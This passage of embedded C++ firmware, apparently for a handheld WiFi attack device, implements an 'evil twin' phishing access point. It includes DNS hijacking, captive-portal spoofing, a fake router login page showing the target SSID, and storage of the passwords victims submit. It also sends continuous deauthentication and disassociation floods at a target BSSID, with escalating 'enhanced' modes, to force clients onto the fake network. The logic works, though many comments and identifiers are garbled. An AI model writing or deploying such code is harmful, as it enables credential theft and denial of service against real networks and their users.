    Serial.println("SSID: " + chosenSsid);
    Serial.println("Password: <Password>");
    Serial.println("Channel: " + String(web_test_channel_dynamic));
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP: ");
    Serial.println(apIp);

    // StartDNSWebService
    startPhishingServices(apIp);

    startWebUILED();

    Serial.println("PhishingModeStartDone，WaitConnect...");
    // InitPhishingCertify，Send
    unsigned long nowInit = millis();
    lastPhishingDeauthMs = nowInit;
    lastPhishingBroadcastMs = nowInit;
    if (phishingHasTarget) {
      int dummy = 0;
      // ：LargeAttackRSSI
      if (g_enhancedDeauthMode) {
        // ：15 * 6Frame = 90Frame
        sendDeauthBatchEnhanced(phishingTargetBSSID, 15, dummy);
      } else {
        // Mode：10 * 3Frame = 30Frame
        sendDeauthBurstToBssidUs(phishingTargetBSSID, 10, dummy, 250);
      }
    }
    return true;
  } else {
    Serial.println("APModeStartFailed!");
    return false;
  }
}

// ============ CleanFunc ============

// StopWebService
void stopWebServer() {
  if (web_server_active) {
    Serial.println("StopWebService...");
    web_server.stop();
    web_server_active = false;
  }
}

// StopDNSService
void stopDNSServer() {
  if (dns_server_active) {
    Serial.println("StopDNSService...");
    dnsServer.stop();
    dns_server_active = false;
  }
}

// DisconnectWiFiConnect
void disconnectWiFi() {
  Serial.println("DisconnectWiFiConnect...");
  WiFi.disconnect();
}

// CleanConnect
void cleanupClients(int maxClients = 10) {
  Serial.println("CleanConnect...");
  for (int i = 0; i < maxClients; i++) {
    WiFiClient client = web_server.available();
    if (client) {
      client.stop();
      delay(10);
    } else {
      break;
    }
  }
}

// CleanPhishingMem
void cleanupPhishingMemory() {
  Serial.println("CleanMem...");
  web_test_submitted_texts.clear();
  web_test_submitted_texts.shrink_to_fit();
}

// PhishingStatusVar
void resetPhishingState() {
  web_test_active = false;
  g_webTestLocked = true;
  webtest_ui_page = 0;
  webtest_password_scroll = 0;
  webtest_password_cursor = 0;
  webtest_border_always_on = false;
  webtest_flash_remaining_toggles = 0;
  webtest_border_flash_visible = true;
}

// StopAttack
void stopAllAttacks() {
  if (deauthAttackRunning) {
    Serial.println("StopDeauthAttack...");
    deauthAttackRunning = false;
    attackstate = 0;
  }

  if (beaconAttackRunning) {
    Serial.println("StopBeaconAttack...");
    beaconAttackRunning = false;
    becaonstate = 0;
  }
}

// WiFiModule
void resetWiFiModule() {
  Serial.println("WiFiModule...");
  wifi_off();
  delay(200);
  wifi_on(RTW_MODE_AP);
  delay(200);
}

// StartPhishingService
void startPhishingServices(IPAddress apIp) {
  // ServiceStopped
  stopDNSServer();
  stopWebServer();

  // StartDNSService
  dnsServer.setResolvedIP(apIp[0], apIp[1], apIp[2], apIp[3]);
  dnsServer.begin();
  dns_server_active = true;

  // StartWebService
  web_server.begin();
  web_server_active = true;
  web_test_active = true;

  Serial.println("PhishingServiceStartDone");
}

// StartWeb UIService
void startWebUIServices(IPAddress apIp) {
  // ServiceStopped
  stopDNSServer();
  stopWebServer();

  // StartDNSService
  dnsServer.setResolvedIP(apIp[0], apIp[1], apIp[2], apIp[3]);
  dnsServer.begin();
  dns_server_active = true;

  // StartWebService
  web_server.begin();
  web_server_active = true;
  web_ui_active = true;

  Serial.println("Web UIServiceStartDone");
}

// PhishingStatusInfo
void showPhishingStatus(const String& line1, const String& line2, int delayMs = 2000) {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  //.setCursor(5, 15);
  //.print(line1);
  //.setCursor(5, 35);
  //.print(line2);
  ////);
  delay(delayMs);
}

// RestartAPMode
void restartOriginalAP() {
  Serial.println("StartAPMode...");
  String channelStr = String(current_channel);
  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
    Serial.println("APModeStartSuccess");
  } else {
    Serial.println("APModeStartFailed");
  }
}

// CleanPhishing
void checkAndCleanupPhishingProcesses() {
  if (web_test_active || web_server_active || dns_server_active) {
    Serial.println("DetectPhishing，Clean...");
    forceCleanupWebTest();
    delay(500); // WaitCleanDone
  }
}

// PhishingStartClean
void cleanupBeforePhishingStart() {
  Serial.println("CleanService...");
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  cleanupPhishingMemory();

  // PhishingStatusVar
  webtest_ui_page = 0;
  webtest_password_scroll = 0;
  webtest_password_cursor = 0;
  webtest_border_always_on = false;
  webtest_flash_remaining_toggles = 0;
  webtest_border_flash_visible = true;

  delay(100);
  // APMode，SDKConfig
  resetWiFiModule();
}

// StopPhishingService（Stop）
void stopPhishingServices() {
  // UsageFuncClean
  stopAllAttacks();
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  cleanupPhishingMemory();
  resetPhishingState();
  closeWebUILED();

  // WiFiModule
  resetWiFiModule();

  // RestoreAPMode
  restartOriginalAP();

  // DoneInfo
  showPhishingStatus("PhishingStop", "Clean", 2000);
}

// ExecPhishing
void performPhishingHealthCheck(unsigned long currentTime) {
  static unsigned long last_health_check = 0;
  if (currentTime - last_health_check >= 30000) { // 30
    last_health_check = currentTime;

    // WebServiceDNSServiceStatus
    if (web_test_active && (!web_server_active || !dns_server_active)) {
      Serial.println("DetectPhishingServiceAbnormal，Clean...");
      forceCleanupWebTest();
      return;
    }

    // MemUsage
    if (web_test_submitted_texts.size() > 500) {
      Serial.println("PhishingTextData，CleanData...");
      web_test_submitted_texts.erase(web_test_submitted_texts.begin(), web_test_submitted_texts.begin() + 200);
      web_test_submitted_texts.shrink_to_fit();
    }
  }
}

// ExecWeb UI
void performWebUIHealthCheck(unsigned long currentTime) {
  static unsigned long last_health_check = 0;
  if (currentTime - last_health_check >= 30000) { // 30
    last_health_check = currentTime;

    // WebServiceDNSServiceStatus
    if (web_ui_active && (!web_server_active || !dns_server_active)) {
      Serial.println("DetectWeb UIServiceAbnormal，Clean...");
      forceCleanupWebUI();
      return;
    }

    // Web UIStatus
    if (web_ui_active != web_server_active) {
      Serial.println("DetectWeb UIStatus，Clean...");
      forceCleanupWebUI();
      return;
    }
  }
}

// Stop
void checkEmergencyStop() {
  if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_DOWN) == LOW && digitalRead(BTN_OK) == LOW) {
    if (web_test_active) {
      Serial.println("DetectStop，CleanPhishing...");
      forceCleanupWebTest();
      // StopInfo
      showPhishingStatus("StopExec", "Clean", 3000);
    } else if (web_ui_active) {
      Serial.println("DetectStop，CleanWeb UI...");
      forceCleanupWebUI();
      // StopInfo
      showPhishingStatus("Web UIStop", "Clean", 3000);
    }
    // Wait
    while (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW || digitalRead(BTN_OK) == LOW) {
      delay(10);
    }
  }
}

// Status，ConfirmSpam
void stabilizeButtonState() {
  // WaitStatus
  delay(200);
  //
  while (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW ||
         digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
    delay(10);
  }
  delay(100); // Time
}

// CleanPhishing（CleanFunc）
void forceCleanupWebTest() {
  Serial.println("=== CleanPhishing ===");

  // UsageFuncClean
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients(20);
  cleanupPhishingMemory();
  resetPhishingState();
  stopAllAttacks();
  closeWebUILED();

  Serial.println("CleanDone");
}

// CleanWeb UI（CleanFunc）
void forceCleanupWebUI() {
  Serial.println("=== CleanWeb UI ===");

  // UsageFuncClean
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients(20);

  // Web UIStatus
  web_ui_active = false;
  g_webUILocked = false;

  // Turn OffLED
  closeWebUILED();

  Serial.println("Web UICleanDone");
}
// ============ Web UI  ============

// StartWeb UI
void startWebUI() {
  Serial.println("=== StartWebUI ===");
  Serial.println("Turn OffAPMode...");

  // ：Web UI
  if (web_ui_active || web_server_active || dns_server_active) {
    Serial.println("DetectWeb UI，Clean...");
    forceCleanupWebUI();
    delay(500); // WaitCleanDone
  }

  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  // StartInfo
  //.setCursor(5, 15);
  //.print("StartWeb UI...");
  ////);

  // UsageFuncCleanService
  Serial.println("CleanService...");
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();

  // WiFiAPMode，SDKPasswordConfig
  resetWiFiModule();

  // StartWebUIAPMode
  Serial.println("StartWebUIAPMode...");
  char channel_str[4];
  sprintf(channel_str, "%d", WEB_UI_CHANNEL);
  if (WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
    Serial.println("WebUI APModeStartSuccess");
    Serial.println("SSID: " + String(WEB_UI_SSID));
    Serial.println("Password: " + String(WEB_UI_PASSWORD));
    Serial.println("Channel: " + String(WEB_UI_CHANNEL));
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP: ");
    Serial.println(apIp);

    // StartWeb UIService
    startWebUIServices(apIp);

    // SettingsWebUI，StartAPMode
    g_webUILocked = true;

    // LED：
    startWebUILED();

    // RunStatus（Format，SSID/PasswordCenter）
    //clearDisplay();
    {
      const char* line1 = "192.168.1.1";
      int w1 = //.getUTF8Width(line1);
      int x1 = (//width() - w1) / 2; if (x1 < 0) x1 = 0;
      //.setCursor(x1, 10);
      //.print(line1);
    }
    // SSID
    {
      String ssidLine = String("SSID: ") + String(WEB_UI_SSID);
      int textW = //.getUTF8Width(ssidLine.c_str());
      const int y = 25;
      int x = 0;
      if (textW <= //width() - 2) {
        x = (//width() - textW) / 2; if (x < 0) x = 0;
        //.setCursor(x, y);
        //.print(ssidLine);
      } else {
        // ，0Start
        int startX = 0;
        //.setCursor(2 - startX, y);
        //.print(ssidLine);
        //.setCursor(2 - startX + textW + 16, y);
        //.print(ssidLine);
      }
    }
    // Password
    {
      String pwdLine = String("Password: ") + String(WEB_UI_PASSWORD);
      int textW = //.getUTF8Width(pwdLine.c_str());
      const int y = 40;
      int x = 0;
      if (textW <= //width() - 2) {
        x = (//width() - textW) / 2; if (x < 0) x = 0;
        //.setCursor(x, y);
        //.print(pwdLine);
      } else {
        int startX = 0;
        //.setCursor(2 - startX, y);
        //.print(pwdLine);
        //.setCursor(2 - startX + textW + 16, y);
        //.print(pwdLine);
      }
    }
    {
      const char* line4 = "BACKExit";
      int w4 = //.getUTF8Width(line4);
      int x4 = (//width() - w4) / 2; if (x4 < 0) x4 = 0;
      //.setCursor(x4, 55);
      //.print(line4);
    }
    ////);

    Serial.println("WebUIStartDone，WaitConnect...");
    delay(3000);
  } else {
    Serial.println("WebUI APModeStartFailed!");
    //clearDisplay();
    //.setCursor(5, 25);
    //.print("Web UIStartFailed!");
    ////);
    delay(2000);
  }
}

// StopWeb UI
void stopWebUI() {
  if (web_ui_active) {
    Serial.println("=== Turn OffWebUI ===");

    // UsageFuncStopService
    stopWebServer();
    stopDNSServer();
    disconnectWiFi();
    cleanupClients();

    // Web UIStatus
    web_ui_active = false;
    g_webUILocked = false;

    // LED：Turn Off
    closeWebUILED();

    // WiFiModule
    resetWiFiModule();

    // StartAPMode
    restartOriginalAP();

    // DoneInfo
    showPhishingStatus("Web UIStopped", "Clean", 2000);

    Serial.println("WebUITurn OffDone，Clean");
  }
}

// StopWeb Test
void stopWebTest() {
  if (web_test_active) {
    Serial.println("=== StopPhishing ===");

    // UsageFuncStopPhishing
    stopPhishingServices();

    Serial.println("PhishingModeStopDone，Clean");
  }
}

// Web TestRequest
void handleWebTestClient(WiFiClient& client) {
  String request = "";
  unsigned long timeout = millis() + 3000;
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      request += c;
      if (request.endsWith("\r\n\r\n")) break;
    }
    delay(1);
  }

  String method = "GET";
  String path = "/";
  int firstSpace = request.indexOf(' ');
  int secondSpace = request.indexOf(' ', firstSpace + 1);
  if (firstSpace > 0 && secondSpace > firstSpace) {
    method = request.substring(0, firstSpace);
    path = request.substring(firstSpace + 1, secondSpace);
  }

  // POSTRequest（ /auth）
  String body = "";
  if (method == "POST") {
    int contentLengthPos = request.indexOf("Content-Length: ");
    if (contentLengthPos >= 0) {
      int contentLengthEnd = request.indexOf("\r\n", contentLengthPos);
      if (contentLengthEnd > contentLengthPos) {
        String contentLengthStr = request.substring(contentLengthPos + 16, contentLengthEnd);
        int contentLength = contentLengthStr.toInt();
        if (contentLength > 0) {
          unsigned long bodyTimeout = millis() + 2000;
          while (client.available() < contentLength && millis() < bodyTimeout) {
            delay(1);
          }
          for (int i = 0; i < contentLength && client.available(); i++) {
            body += (char)client.read();
          }
          request += body;
        }
      }
    }
  }

  // Captive Portal Detect：Back200，System
  if (path == "/generate_204" || path == "/gen_204" || path == "/ncsi.txt" || path == "/hotspot-detect.html" || path.startsWith("/connecttest.txt") || path.startsWith("/library/test/success.html") || path.startsWith("/success.txt")) {
    String body = "<html><head><meta http-equiv=\"refresh\" content=\"0; url=/\"></head><body></body></html>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  }
  else if (path == "/" || path == "/index.html") {
    // SelectAPTypeBackHTML
    String header = "HTTP/1.1 200 OK\r\n";
    header += "Content-Type: text/html; charset=UTF-8\r\n";
    header += "Cache-Control: public, max-age=300\r\n";
    switch (g_apSelectedPage) {
      case AP_WEB_TEST:
        {
          size_t pageLen = strlen_P(WEB_AUTH1_HTML);
          header += "Content-Length: " + String(pageLen) + "\r\n";
          header += "Connection: close\r\n\r\n";
          client.print(header);
          client.print(F(WEB_AUTH1_HTML));
        }
        break;
      case AP_WEB_ROUTER_AUTH:
      default: {
        // Medium {SSID} TargetWiFiSSID，YesWEB_UI_SSID
        String page = FPSTR(WEB_AUTH2_HTML);
        String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
        page.replace("{SSID}", targetSsid);
        header += "Content-Length: " + String(page.length()) + "\r\n";
        header += "Connection: close\r\n\r\n";
        client.print(header);
        client.print(page);
        break;
      }
    }
  } else if (path == "/status") {
    handleStatusRequest(client);

  } else if (path == "/auth" && method == "POST") {
    // JSON {"text":"..."}
    String text = "";
    int tPos = body.indexOf("\"text\":");
    if (tPos >= 0) {
      int firstQuote = body.indexOf('"', tPos + 6);
      if (firstQuote >= 0) {
        int secondQuote = body.indexOf('"', firstQuote + 1);
        if (secondQuote > firstQuote) {
          text = body.substring(firstQuote + 1, secondQuote);
        }
      }
    }
    // Text
    if (text.length() > 0) {
      web_test_submitted_texts.push_back(text);
      if (!webtest_border_always_on) {
        // Password：Turn On
        webtest_border_always_on = true;
        webtest_flash_remaining_toggles = 0;
        webtest_border_flash_visible = true;
      } else {
        // Password：（4）
        webtest_flash_remaining_toggles = 4;
        webtest_last_flash_toggle_ms = millis();
        // Start：""Start
        webtest_border_flash_visible = false;
      }
      // ，UsedMemLarge
      if (web_test_submitted_texts.size() > 200) {
        web_test_submitted_texts.erase(web_test_submitted_texts.begin(), web_test_submitted_texts.begin() + 50);
      }
    }

    String body = "{\"success\":true}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  } else {
    String hdr = "HTTP/1.1 302 Found\r\n";
    hdr += "Location: /\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
  }
  client.stop();
}

// SendWeb Test
void sendWebTestPage(WiFiClient& client) {
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  // ：DefaultBackSelect
  switch (g_apSelectedPage) {
    case AP_WEB_TEST: client.print(F(WEB_AUTH1_HTML)); break;
    case AP_WEB_ROUTER_AUTH:
    default: {
      String page = FPSTR(WEB_AUTH2_HTML);
      String targetSsid = web_test_active ? web_test_ssid_dynamic : String(WEB_UI_SSID);
      page.replace("{SSID}", targetSsid);
      client.print(page);
      break;
    }
  }
}

// OLED：APSelectMenu（Extension）
bool apWebPageSelectionMenu() {
  // Attack/Menu，Select，128x64
  int sel = g_apSelectedPage;
  const int RECT_H = HOME_RECT_HEIGHT;
  if (sel < 0 || sel >= AP_MENU_ITEM_COUNT) sel = 0;

  // Var，
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;

  while (true) {
    unsigned long currentTime = millis();
    if (digitalRead(BTN_BACK) == LOW) { return false; }
    if (digitalRead(BTN_OK) == LOW) { g_apSelectedPage = sel; return true; }
    if (digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if (sel > 0) sel--;
      lastUpTime = currentTime;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if (sel < AP_MENU_ITEM_COUNT - 1) sel++;
      lastDownTime = currentTime;
    }

    // Height
    //clearDisplay();
    //setTextSize(1);
    g_apBaseStartIndex = 0;
    g_apSkipRelIndex = sel; //
    drawApMenuBase_NoFlush();
    g_apSkipRelIndex = -1;
    // Y（Select）
    int y = 20 + sel * HOME_ITEM_HEIGHT;
    //drawRoundRect(0, y, //width() - UI_RIGHT_GUTTER, RECT_H, 4, SSD1306_WHITE);
    // MediumSelect1
    {
      int textY = y + 13; //  +12， +1
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      //.setCursor(6, textY);
      if (sel >= 0 && sel < AP_MENU_ITEM_COUNT) {
        //.print(g_apMenuItems[sel]);
      }
    }
    ////);
  }
}

// OLED：CertifyText
void showAuthTextOnOLED(const String& text) {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  //.setCursor(5, 15);
  //.print("Certify:");
  //.setCursor(5, 32);
  //.print(text);
  //.setCursor(5, 55);
  //.print("BACKBack");
  ////);
}
// Spam：CenterRadius，，BackTurn Off
void showModalMessage(const String& line1, const String& line2) {
  const int rectW = 116;
  const int rectH = 36;
  const int rx = (//width() - rectW) / 2;
  const int ry = (//height() - rectH) / 2;
  // ：，，Border
  //fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
  //drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  //  line1/line2 WidthCenter
  String message = line1;
  if (line2.length() > 0) message += String("\n") + line2;

  const int paddingX = 6;
  const int maxLineWidth = rectW - paddingX * 2;
  const int lineHeight = 14; // Menu

  // （，）
  std::vector<String> lines;
  int start = 0;
  while (start <= (int)message.length()) {
    int nl = message.indexOf('\n', start);
    if (nl < 0) nl = message.length();
    lines.push_back(message.substring(start, nl));
    if (nl >= (int)message.length()) break;
    start = nl + 1;
  }
  if (lines.empty()) lines.push_back("");

  // Center
  int totalTextH = (int)lines.size() * lineHeight;
  int firstBaselineY = ry + (rectH - totalTextH) / 2 + 12; //

  // Center
  for (size_t i = 0; i < lines.size(); i++) {
    const String& s = lines[i];
    int w = //.getUTF8Width(s.c_str());
    if (w > maxLineWidth) w = maxLineWidth;
    int x = rx + (rectW - w) / 2;
    int y = firstBaselineY + (int)i * lineHeight;
    //.setCursor(x, y);
    //.print(s);
  }
  ////);

  // Turn Off，，
  // Wait
  while (digitalRead(BTN_BACK) != LOW && digitalRead(BTN_OK) != LOW &&
         digitalRead(BTN_UP) != LOW && digitalRead(BTN_DOWN) != LOW) { delay(10); }
  // Wait
  while (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW ||
         digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) { delay(10); }
  // Time，
  unsigned long stableStart = millis();
  while (true) {
    bool anyKeyLow = (digitalRead(BTN_BACK) == LOW) || (digitalRead(BTN_OK) == LOW) ||
                     (digitalRead(BTN_UP) == LOW) || (digitalRead(BTN_DOWN) == LOW);
    if (anyKeyLow) {
      stableStart = millis();
    }
    if (millis() - stableStart >= 200) {
      break;
    }
    delay(10);
  }
}

// AP/SSIDSelectConfirmSpam："Back"Turn OffSpamExec，"Select"ap/ssidSelect
bool showSelectSSIDConfirmModal() {
  const int rectW = 116;
  const int rectH = 40;
  const int rx = (//width() - rectW) / 2;
  const int ry = (//height() - rectH) / 2;

  while (true) {
    // BgBorder
    //fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
    //drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // ：CenterHintInfo
    String line1 = "SelectAP/SSID";
    int w = //.getUTF8Width(line1.c_str());
    if (w > rectW - 12) w = rectW - 12;
    int line1x = rx + (rectW - w) / 2;
    int line1y = ry + 16;
    //.setCursor(line1x, line1y);
    //.print(line1);

    // ：HintHint
    String leftHint = "《 Back";
    String rightHint = "Select 》";
    int hintY = ry + rectH - 8;
    //
    //.setCursor(rx + 6, hintY);
    //.print(leftHint);
    //
    int rightW = //.getUTF8Width(rightHint.c_str());
    int rightX = rx + rectW - 6 - rightW;
    //.setCursor(rightX, hintY);
    //.print(rightHint);

    ////);

    // ：BACK Back，OK Select
    if (digitalRead(BTN_BACK) == LOW) {
      // WaitBACK
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      // Time
      delay(200);
      return false; // Back，Exec
    }

    if (digitalRead(BTN_OK) == LOW) {
      // WaitOK
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      // Time
      delay(200);
      return true; // AP/SSIDSelect
    }

    delay(10);
  }
}

// ConfirmSpam： showModalMessage，Center，Hint
bool showConfirmModal(const String& line1, const String& leftHint, const String& rightHint) {
  const int rectW = 116;
  const int rectH = 40; // InfoSpamHeightHint
  const int rx = (//width() - rectW) / 2;
  const int ry = (//height() - rectH) / 2;

  while (true) {
    // BgBorder
    //fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
    //drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // ：Center
    int w = //.getUTF8Width(line1.c_str());
    if (w > rectW - 12) w = rectW - 12;
    int line1x = rx + (rectW - w) / 2;
    int line1y = ry + 16; //
    //.setCursor(line1x, line1y);
    //.print(line1);

    // ：HintHint
    int hintY = ry + rectH - 8; //
    //
    //.setCursor(rx + 6, hintY);
    //.print(leftHint);
    //
    int rightW = //.getUTF8Width(rightHint.c_str());
    int rightX = rx + rectW - 6 - rightW;
    //.setCursor(rightX, hintY);
    //.print(rightHint);

    ////);

    // ：BACK Cancel，OK Confirm
    // UsageDetect
    if (digitalRead(BTN_BACK) == LOW) {
      // WaitBACK
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      // Time
      delay(200);
      return false; // Cancel
    }

    if (digitalRead(BTN_OK) == LOW) {
      // WaitOK
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      // Time
      delay(200);
      return true; // Confirm
    }

    delay(10);
  }
}

// Web UI
void handleWebUI() {
  // Button
  if (digitalRead(BTN_BACK) == LOW) {
    // Status，ConfirmSpam
    stabilizeButtonState();

    // Turn OffConfirmSpam
    if (showConfirmModal("Turn OffWeb UI")) {
      stopWebUI();
    }
    return;
  }

  // Web
  unsigned long currentTime = millis();
  if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
    last_web_check = currentTime;

    WiFiClient client = web_server.available();
    if (client) {
      handleWebClient(client);
    }
  }

  // ExecSSIDBeaconAttack（）
  if (beaconAttackRunning) {
    executeCustomBeaconFromWeb();
  }

  // StatusInfo
  static unsigned long last_status_update = 0;
  if (currentTime - last_status_update >= 1000) {
    last_status_update = currentTime;
    displayWebUIStatus();
  }
}

// Web Test
void handleWebTest() {
  // Var，
  static unsigned long lastUpTime = 0;
  static unsigned long lastDownTime = 0;
  static unsigned long lastBackTime = 0;
  static unsigned long lastOkTime = 0;

  // Nav
  if (webtest_ui_page == 0) {
    drawWebTestMain();
  } else if (webtest_ui_page == 1) {
    drawWebTestInfo();
  } else if (webtest_ui_page == 2) {
    drawWebTestPasswords();
  } else if (webtest_ui_page == 3) {
    drawWebTestStatus();
  }

  //
  unsigned long currentTime = millis();
  if (digitalRead(BTN_BACK) == LOW) {
    if (currentTime - lastBackTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      // Back：ConfirmSpam，ConfirmStopWebTest
      // Status，ConfirmSpam
      stabilizeButtonState();

      bool confirmed = showConfirmModal("ConfirmStopPhishing");
      if (confirmed) {
        stopWebTest();
      } else {
        // Cancel：Turn OffSpam，Back
      }
    } else if (webtest_ui_page == 1) {
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      webtest_ui_page = 0;
      webtest_password_cursor = 0;
      webtest_password_scroll = 0;
    } else if (webtest_ui_page == 3) {
      webtest_ui_page = 0;
    }
    lastBackTime = currentTime;
    return;
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 1; // Info
    } else if (webtest_ui_page == 1) {
      // InfoUPBack
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      if (webtest_password_scroll > 0) webtest_password_scroll--;
    } else if (webtest_ui_page == 3) {
      // StatusUPBack
      webtest_ui_page = 0;
    }
    lastUpTime = currentTime;
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 3; // RunStatus
    } else if (webtest_ui_page == 1) {
      // InfoDOWNBack
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      if (web_test_submitted_texts.size() > 0) {
        // ：
        if (webtest_password_scroll < (int)web_test_submitted_texts.size() - 1) webtest_password_scroll++;
      }
    } else if (webtest_ui_page == 3) {
      // StatusDOWNBack
      webtest_ui_page = 0;
    }
    lastDownTime = currentTime;
  }
  // ：OKPasswordList，BACK/OKBack
  // OKPasswordList
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 2; // OKPasswordList
    } else if (webtest_ui_page == 2) {
      // PasswordListOKBack
      webtest_ui_page = 0;
    }
    lastOkTime = currentTime;
  }

  // Phishing：SendCertify（Packet）
  // UsageSend：Attack
  if (phishingHasTarget) {
    unsigned long now = millis();

    // ：LargeAddAttackRSSI
    if (web_test_active && web_client.connected()) {
      phishingDeauthInterval = 800; // Freq
      phishingBatchSize = 2; // HeightRSSI
    } else {
      phishingDeauthInterval = 180;  // Height
      phishingBatchSize = 6; // LargeRSSI
    }

    if (now - lastPhishingDeauthMs >= (unsigned long)phishingDeauthInterval) {
      int dummyCount = 0;
      // UsageSend：Attack，
      if (g_enhancedDeauthMode) {
        // ： * 6Frame
        sendDeauthBatchEnhanced(phishingTargetBSSID, phishingBatchSize, dummyCount);
      } else {
        // Mode：UsagePacket
        sendDeauthBurstToBssidUs(phishingTargetBSSID, phishingBatchSize, dummyCount, 250);
      }
      lastPhishingDeauthMs = now;
    }
    if (now - lastPhishingBroadcastMs >= 1000UL) {
      // Broadcast：Usage，LargeAddSend
      if (g_enhancedDeauthMode) {
        // Broadcast：6，Send5
        const uint16_t broadcastReasons[] = {1, 4, 7, 8, 15, 16};
        for (int i = 0; i < 6; i++) {
          wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, broadcastReasons[i], 5, 200);
        }
        // Add5
        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 5, 200);
      } else {
        // Mode：UsageBroadcast
        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 7, 2, 500);
        wifi_tx_broadcast_deauth((void*)phishingTargetBSSID, 1, 2, 500);
        wifi_tx_broadcast_disassoc((void*)phishingTargetBSSID, 8, 1, 500);
      }
      lastPhishingBroadcastMs = now;
    }
  }

  if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
    last_web_check = currentTime;
    WiFiClient client = web_server.available();
    if (client) {
      handleWebTestClient(client);
    }
  }

}

// Web UIStatus
void displayWebUIStatus() {
  //clearDisplay();
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  {
    const char* t = "192.168.1.1";
    int w = //.getUTF8Width(t);
    int x = (//width() - w) / 2; if (x < 0) x = 0;
    //.setCursor(x, 10);
    //.print(t);
  }
  // ：SSID，Length，NoCenter
  {
    String ssidLine = String("SSID: ") + String(WEB_UI_SSID);
    int textW = //.getUTF8Width(ssidLine.c_str());
    const int y = 25;
    static int ssidScrollX = 0;
    static unsigned long ssidLastScrollMs = 0;
    const int scrollDelay = 150; // ms
    if (textW <= //width() - 2) {
      int x = (//width() - textW) / 2; if (x < 0) x = 0;
      //.setCursor(x, y);
      //.print(ssidLine);
      ssidScrollX = 0;
    } else {
      if (millis() - ssidLastScrollMs > (unsigned)scrollDelay) {
        ssidScrollX = (ssidScrollX + 2) % (textW + 16);
        ssidLastScrollMs = millis();
      }
      int startX = ssidScrollX;
      //.setCursor(2 - startX, y);
      //.print(ssidLine);
      //.setCursor(2 - startX + textW + 16, y);
      //.print(ssidLine);
    }
  }
  // ：Password，Length，NoCenter
  {
    String pwdLine = String("Password: ") + String(WEB_UI_PASSWORD);
    int textW = //.getUTF8Width(pwdLine.c_str());
    const int y = 40;
    static int pwdScrollX = 0;
    static unsigned long pwdLastScrollMs = 0;
